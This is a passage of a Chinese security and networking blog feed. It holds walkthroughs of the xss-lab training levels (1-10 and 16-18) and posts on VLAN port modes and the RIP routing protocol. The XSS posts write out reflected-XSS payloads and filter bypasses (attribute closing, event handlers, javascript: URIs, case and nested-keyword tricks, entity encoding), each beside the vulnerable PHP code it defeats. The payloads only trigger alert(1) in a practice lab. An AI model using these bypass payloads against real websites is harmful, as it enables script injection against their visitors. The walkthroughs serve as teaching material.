class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);`</span><br><span class="line"></span><br><span class="line">`$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);`</span><br><span class="line"></span><br><span class="line">`$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);`</span><br><span class="line"></span><br><span class="line">`$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);`</span><br><span class="line"></span><br><span class="line">`$str5=str_replace(&quot;     &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br></pre></td></tr></table></figure><h6 id="第17关："><a href="#第17关：" class="headerlink" title="第17关："></a>第17关：</h6><p>从这一关开始应该是flash xss注入，但是这一关可以不采用，可以通过闭合注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02= onmouseover=javascript:alert(1)</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br></pre></td></tr></table></figure><p>要注意的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;</span><br></pre></td></tr></table></figure><p>这个语句是可以拆解的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;embed src=xsf01.swf?&quot; &quot; width=100% heigth=100%&gt;&quot;</span><br></pre></td></tr></table></figure><p>本身就是闭合的，所以不需要构造闭合，所以可以绕过htmlspecialchars该函数，因此，我们输入的才会被当成独立事件属性，不然就需要去构造闭合，而对于htmlspecialchars来说，双引号是特殊处理的，不能用来闭合，就像19关一样</p><h6 id="第18关："><a href="#第18关：" class="headerlink" title="第18关："></a>第18关：</h6><p>与17关是一样的</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br></pre></td></tr></table></figure><p>注：第17、18关都可以通过flash xss注入</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xss注入与sql注入有很多相似之处，如果有sql学习的基础，那么学习xss将会很轻松，xss注入的方法总的来说就方面，一方面从js脚本入手，如果js方面的防御机制，可以考虑绕过，或者选择html的标签中的事件属性注入，本文并没有涉及flash xss攻击，flash xss会作为单独一章，而且也没有涉及存储型xss攻击，关于存储型xss会在dvwa中讲到&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://soliym.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab(1-10)详细讲解</title>
    <link href="http://soliym.top/2021/06/19/xss-lab(1-10)%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/"/>
    <id>http://soliym.top/2021/06/19/xss-lab(1-10)详细讲解/</id>
    <published>2021-06-19T14:37:21.108Z</published>
    <updated>2020-05-06T09:12:45.523Z</updated>
    
    <content type="html"><![CDATA[<h4 id="xss概述"><a href="#xss概述" class="headerlink" title="xss概述"></a>xss概述</h4><p>​    XSS，全称跨站脚本，XSS跨站脚本（Cross-Site Scripting，XSS（与css-层叠样式表冲突，所以命名为xss）），某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要注意的是，XSS不仅仅扩展JavaScript，还包括flash等其他脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><a id="more"></a><h4 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h4><p>​    通过xss-lab来学习xss攻击，xss-lab是一个用于学习的平台，需要自己搭建平台</p><p> 1、xss-lab平台搭建</p><p>​    1.1 xss-lab下载地址：</p><p>​        链接：<a href="https://pan.baidu.com/s/1sLh5suCgkNsXKbODJ1T8GA" target="_blank" rel="noopener">https://pan.baidu.com/s/1sLh5suCgkNsXKbODJ1T8GA</a> </p><p>​        提取码：zr17</p><p>​    1.2 搭建平台</p><p>​        使用linux+apache+linux搭建网站，网站的搭建比较简单就不写了</p><p>2、开始学习xss攻击</p><p>​    首先介绍一下xss-lab，xss-lab是一个用于学习xss注入的平台，使用php编写的后台代码，一共有20关，每一    关都有不同的xss注入漏洞，我们要找出漏洞，并且通过漏洞注入代码，方可以通关。</p><p>​    虽然每一关都是不同的，但是注入的方法只有几种，不过涉及的知识点是比较多而且广泛的，大多都是与前    端相关的。xss-lab后面会涉及flash xss攻击，后面将会单独作为章节。</p><p>​    关于涉及到的知识点，会在注入的时候提到</p><h4 id="xss攻击实例"><a href="#xss攻击实例" class="headerlink" title="xss攻击实例"></a>xss攻击实例</h4><h5 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h5><p>get型注，在url中的name字段中输入，输入的内容会在页面回显。显示内容是在html标签之间，所以采用标签注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>弹出消息框，存在xss漏洞</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过get型，获得name参数，然后在注入js代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入之后：</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户&lt;script&gt;alert(1)&lt;/script&gt;&lt;/h2&gt;</span><br></pre></td></tr></table></figure><p>这一关没有任何防护措施</p><p>​    </p><h5 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h5><p>在网页源代码中，我们输入的数据，是在表单中的value属性内，所以需要先闭合input标签，然后在注入代码，闭合标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>第一种方法是通过闭合标签，然后使用脚本代码，另一种是闭合value属性，然后在input标签内加入事件属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(11)</span><br></pre></td></tr></table></figure><p>查看源码：</p><p>在h2标签中有.htmlspecialchars($str)，所以在该地方没有xss注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在input标签中，value属性没有过滤，所以有xss注入漏洞</p><p>本关在h2标签中有防御机制，但是在input中是没有的，所以可以在input中注入</p><h5 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h5><p>输入script,”&lt;”会被转换为html编码，所以这一关无法采用标签，因为标签都是带有”&lt;”的，因此采用事件，需要闭合标签的属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=&apos;alert(1)</span><br></pre></td></tr></table></figure><p>可以通过查看网页的html页面，确定闭合方式，以及是否闭合</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br></pre></td></tr></table></figure><p>所有的地方都被htmlspecialchars函数过滤了，该函数可以过滤“&lt;”“&gt;”““ ”，但是不会过滤单引号，而且value的闭合也是采用单引号，所以会有xss漏洞</p><p>本关所有的地方有都防御机制，所以需要绕过该防御机制，因此采用事件方法，并且使用单引号闭合，这样就可以绕过函数的html实体化</p><h5 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h5><p>先试探防御机制，发现value值中把“&lt;”过滤了，所以采用事件注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br></pre></td></tr></table></figure><p>过滤了尖括号</p><p>本关的防御机制是过滤了，html标签必须采用的“&lt;”，单号没有考虑事件</p><h5 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h5><p>先试探防御机制，这一关把ri转换为r_i，所以考虑绕过该机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>采用大小写同样会被转换，所以换一个不带ri的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=1 o_nerror=alert(1)</span><br></pre></td></tr></table></figure><p>然后发现on也被过滤了，而且所有的事件属性都是带有on的，所以在此处无法采用事件</p><p>采用其他标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure><p>点击图片就会触发</p><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br></pre></td></tr></table></figure><p>第一行，将数据转换为小写</p><p>第二行，第二行将script转换</p><p>第三行，将on转换</p><p>本关考虑了标签、及事件的转换，但是没有考虑完整</p><h5 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h5><p>通过试探，和上一关很相似，采用上一关的做法，发现href也被过滤了，但是这一关没有过滤大小写，所有的标签都可以用，只要换成大写，或大小写混合就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot;</span><br><span class="line">&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br></pre></td></tr></table></figure><p>本关对标签，事件都有过滤，但是唯一的漏洞就是没有过滤大小写</p><h5 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h5><p>通过试探，发现script被过滤了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;alert(1)&lt;/&gt;</span><br></pre></td></tr></table></figure><p>所有采用嵌套的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>发现可以使用，然后构造闭合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>采用事件注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;  onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>on被过滤，所以嵌套注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;  oonnclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br></pre></td></tr></table></figure><p>本关与上一关的不同，在于转换后的内容不同，虽然添加了大小写转换，但是因为转换后，字符被转换为空字符，所以转换后的字符如何仍可以组合成，那么就可以绕过该防御机制</p><h5 id="第8关："><a href="#第8关：" class="headerlink" title="第8关："></a>第8关：</h5><p>通过试探，发现无法构造闭合，采用是采用了htmlspecialchars($str)函数，而且闭合方式是双引号，所以input中无法注入，但是在连接里面是有地方可以注入的，首先是试探是否有防御机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr_ipt:alert(1)</span><br></pre></td></tr></table></figure><p>发现与第6关一样，做了过滤，采用html实体编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br></pre></td></tr></table></figure><p>这一关基本过滤了所以关键字和大小写，所以采用html实体编码</p><h5 id="第9关："><a href="#第9关：" class="headerlink" title="第9关："></a>第9关：</h5><p>通过试探，这一关与上一关不同的是会在上一关的基础上，加入地址的检查，首先判断会检查哪些内容，这一关会检查输入的数据中是否会有http：//字段，所以需要在输入的字段中加入该字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&apos;http://&apos;)</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">false===strpos($str7,&apos;http://&apos;)</span><br></pre></td></tr></table></figure><p>这一关会检查字段的值</p><h5 id="第10关："><a href="#第10关：" class="headerlink" title="第10关："></a>第10关：</h5><p>这一没有输入的地方，需要在url地址栏中输入，这一时输入是隐藏的，也就是说keyname并不是要注入的地方，真正注入的地方是三个input，不过这三个被隐藏了，所以需要去试探这三个那个是正确的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这一关也会过滤“&lt;”,所以可以绕过，也可以用事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&quot; onmouseover=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>但是因为input是隐藏的，所以不会触发事件，需要通过其它方法触发</p><p>采用html的accesskey属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>注意：不同的浏览器有不同的触发方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">火狐是shift+ctrl+x（定义的）</span><br><span class="line">Chrome alt+x</span><br></pre></td></tr></table></figure><p>采用type属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;xss概述&quot;&gt;&lt;a href=&quot;#xss概述&quot; class=&quot;headerlink&quot; title=&quot;xss概述&quot;&gt;&lt;/a&gt;xss概述&lt;/h4&gt;&lt;p&gt;​    XSS，全称跨站脚本，XSS跨站脚本（Cross-Site Scripting，XSS（与css-层叠样式表冲突，所以命名为xss）），某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要注意的是，XSS不仅仅扩展JavaScript，还包括flash等其他脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://soliym.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://soliym.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>vlan接口模式</title>
    <link href="http://soliym.top/2021/06/19/vlan%E6%8E%A5%E5%8F%A3%E6%A8%A1%E5%BC%8F/"/>
    <id>http://soliym.top/2021/06/19/vlan接口模式/</id>
    <published>2021-06-19T14:37:21.082Z</published>
    <updated>2019-12-24T08:47:58.730Z</updated>
    
    <content type="html"><![CDATA[<p>vlan三种接口模式区别：</p><a id="more"></a><h3 id="Access端口"><a href="#Access端口" class="headerlink" title="Access端口"></a>Access端口</h3><h4 id="1、收到数据包"><a href="#1、收到数据包" class="headerlink" title="1、收到数据包"></a>1、收到数据包</h4><p>收到一个数据包，判断是否有vlan信息，如果没有则打上端口的pvid，并进行交换转发</p><h4 id="2、发送数据包"><a href="#2、发送数据包" class="headerlink" title="2、发送数据包"></a>2、发送数据包</h4><p>将数据包的vlan信息剥离，直接发送出去</p><h3 id="Trunk端口"><a href="#Trunk端口" class="headerlink" title="Trunk端口"></a>Trunk端口</h3><h4 id="1、收到数据包-1"><a href="#1、收到数据包-1" class="headerlink" title="1、收到数据包"></a>1、收到数据包</h4><p>1）收到一个数据包，判断是否有vlan信息，如果没有则打上端口的pvid，并进行交换转发</p><p>2）如果有vlan信息，则判断该trunk端口是否容许该vlan数据包进入，容许转发，否则丢弃。</p><h4 id="2、发送数据包-1"><a href="#2、发送数据包-1" class="headerlink" title="2、发送数据包"></a>2、发送数据包</h4><p>比较端口的pvid和发送的vlan信息，如果相同则剥离vlan信息，然后发送，不相等，则直接发送。</p><h3 id="hybrid端口"><a href="#hybrid端口" class="headerlink" title="hybrid端口"></a>hybrid端口</h3><h4 id="1、收到数据包-2"><a href="#1、收到数据包-2" class="headerlink" title="1、收到数据包"></a>1、收到数据包</h4><p>1）没有vlan信息，则打上端口的pvid，然后交换转发</p><p>2）有vlan信息，则判断该端口是否容许该vlan的数据包进入</p><h4 id="2、发送数据包-2"><a href="#2、发送数据包-2" class="headerlink" title="2、发送数据包"></a>2、发送数据包</h4><p>判断该vlan的属性</p><p>1）untagged 剥离vlan tag，进行转发</p><p>2）tagged 直接发送</p><p>3）没有接口容许vlan，丢弃</p><p>注：交换机内部在处理数据包时，所有数据包一定是打上vlan tag的</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、tag报文是在原来以太网mac帧格式的基础上，在源mac和目的mac地址的后面加上4字节的vlan信息，组成802.1q帧，对于vlan信息PC网卡不能识别</p><p>2、access端口只能属于一个vlan</p><p>3、trunk端口可用于多个vlan通信</p><p>4、hybrid端口允许端个vlan通过，可以接受和发送多vlan报文</p><p>5、hybrid和trunk端口在处理数据报时，方法是一样的，不同在于，发送数据包，hybrid端口可以容许多个vlan数据包发送时不打标签，trunk端口只容许缺省vlan的数据包发送时不打标签</p><p>6、access端口只属于一个vlan，所以它的缺省vlan就是在所在vlan，hybrid和trunk端口属于多个vlan，他们的缺省vlan为vlan 1</p><p>7、如果设置了端口的缺省vlan id，当端口收到不带vlan tag的数据包之后，则将数据包转发到缺省vlan所在的交换机端口，当端口发送带有vlan tag的数据包时，如果数据包的vlan id与端口缺省vlan 相同，则交换机将去掉数据包携带的vlan tag，然后转发到该接口。</p><p>8、华为交换机的缺省vlan为pvid</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vlan三种接口模式区别：&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="HCNP" scheme="http://soliym.top/tags/HCNP/"/>
    
  </entry>
  
  <entry>
    <title>RIP路由信息简述</title>
    <link href="http://soliym.top/2021/06/19/RIP%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E7%AE%80%E8%BF%B0/"/>
    <id>http://soliym.top/2021/06/19/RIP路由信息简述/</id>
    <published>2021-06-19T14:37:21.072Z</published>
    <updated>2019-09-02T09:12:33.464Z</updated>
    
    <content type="html"><![CDATA[<h4 id="RIP：路由信息协议"><a href="#RIP：路由信息协议" class="headerlink" title="RIP：路由信息协议"></a>RIP：路由信息协议</h4> <a id="more"></a><h5 id="1-定义："><a href="#1-定义：" class="headerlink" title="1. 定义："></a><strong>1.</strong> <strong>定义：</strong></h5><p>路由信息协议（英语：Routing Information Protocol，缩写：RIP）是一种内部网关协议（IGP），为最早出现的距离向量路由协议。属于网络层，可以通过不断的交换信息让路由器动态的适应网络连接的变化，这些信息包括每个路由器可以到达哪些网络，这些网络有多远等。</p><p>RIP是一种分布式的基于距离向量的路由选择协议，是因特网的标准协议， RIP协议要求网络中每一个路由器都要维护从它自己到其他每一个目的网络的距离记录。RIP协议将“距离”定义为：从一路由器到直接连接的网络的距离定义为1。从一路由器到非直接连接的网络的距离定义为每经过一个路由器则距离加1。“距离”也称为“跳数”。RIP允许一条路径最多只能包含15个路由器，因此，距离等于16时即为不可达。可见 RIP协议只适用于小型互联网，并不适用于复杂网络的情况。</p><h5 id="2-特点："><a href="#2-特点：" class="headerlink" title="2. 特点："></a>2. 特点：</h5><p>（1）仅和相邻的路由器交换信息。如果两个路由器之间的通信不经过另外一个路由器，那么这两个路由器是相邻的。RIP协议规定，不相邻的路由器之间不交换信息。</p><p>（2）路由器交换的信息是当前路由器所知道的全部信息，即自己的路由表。</p><p>（3）按固定时间交换路由信息，如，每隔30秒，然后路由器根据收到的路由信息更新路由表。（也可进行相应配置使其触发更新）</p><h5 id="3-版本："><a href="#3-版本：" class="headerlink" title="3.版本："></a>3.版本：</h5><h6 id="（1）版本"><a href="#（1）版本" class="headerlink" title="（1）版本"></a>（1）版本</h6><p>​       RIPv1:使用有类路由，在它的路由更新(Routing Updates)中并不带有子网的资讯，因此它无法支援可变长度子网掩码。这个限制造成在RIPv1的网络中，在同级网络下无法使用不同的子网掩码。换句话说，在同一个网络下所有的子网络数目都是相同的。另外，它也不支援对路由过程时的认证，使得RIPv1有一些轻微的弱点，有机会遭受到可能的攻击。</p><p>​       RIPv2：因为RIPv1的缺陷，RIPv2在1994年被提出，与RIP1最大的不同是RIP2为一个无类别路由协议，其更新消息中携带子网掩码，它支持VLSM、CIDR、认证和多播。另外针对安全性的问题，RIPv2也提供一套方法，未透过加密来达到认证的效果。而之后[RFC 2082]也定义了利用MD5来达到认证的方法。</p><p>​       RIPng：主要是针对IPv6做一些延伸的规范。与RIPv2相比下其最主要的差异是：RIPv2支援RIP更新认证, RIPng 则不支持，因为IPv6路由器理应会使用IPsec来进行身份验证；RIPv2 容许给路由器附上任何标签， RIPng 则不容许；</p><p>RIPv2 在每个路由表项中都保存下一跳的信息，RIPng是对一组路由表项指定下一跳信息；RIPv2 使用UDP端口520和多播地址224.0.0.9通信，RIPng 则使用UDP端口521和多播地址FF02::9通信。</p><h6 id="（2）总结RIPv1和RIPv2的区别"><a href="#（2）总结RIPv1和RIPv2的区别" class="headerlink" title="（2）总结RIPv1和RIPv2的区别"></a>（2）总结RIPv1和RIPv2的区别</h6><p>1.RIPv1是有类路由协议（不携带掩码），RIPv2是无类路由协议（携带掩码）</p><p>2.RIPv1不能支持VLSM，RIPv2可以支持VLSM</p><p>3.RIPv1没有认证的功能，RIPv2可以支持认证，并且有明文和MD5两种认证</p><p>4.RIPv1没有手工汇总的功能，RIPv2可以在关闭自动汇总的前提下，进行手工汇总</p><p>5.RIPv1是广播更新，RIPv2是组播更新，</p><p>6.RIPv1对路由没有标记的功能，RIPv2可以对路由打标记（tag），用于过滤和做策略</p><p>7.RIPv1发送的updata最多可以携带25条路由条目，RIPv2在有认证的情况下最多只能携带24条路由</p><p>8.RIPv1发送的updata包里面没有next-hop属性，RIPv2有next-hop属性，可以用与路由更新的重定</p><h5 id="4-工作原理："><a href="#4-工作原理：" class="headerlink" title="4. 工作原理："></a>4. 工作原理：</h5><p>​       （1）初始化——RIP[1]初始化时，会从每个参与工作的接口上发送请求数据包。该请求数据包会向所有的RIP路由器请求一份完整的路由表。该请求通过LAN上的广播形式发送LAN或者在点到点链路发送到下一跳地址来完成。这是一个特殊的请求，向相邻设备请求完整的路由更新。 　　</p><p>​       （2）接收请求——RIP有两种类型的消息，响应和接收消息。请求数据包中的每个路由条目都会被处理，从而为路由建立度量以及路径。RIP采用跳数度量，值为1的意为着一个直连的网络，16，为网络不可达。路由器会把整个路由表作为接收消息的应答返回。 　　</p><p>​       （3）接收到响应——路由器接收并处理响应，它会通过对路由表项进行添加，删除或者修改作出更新。 　　</p><p>​       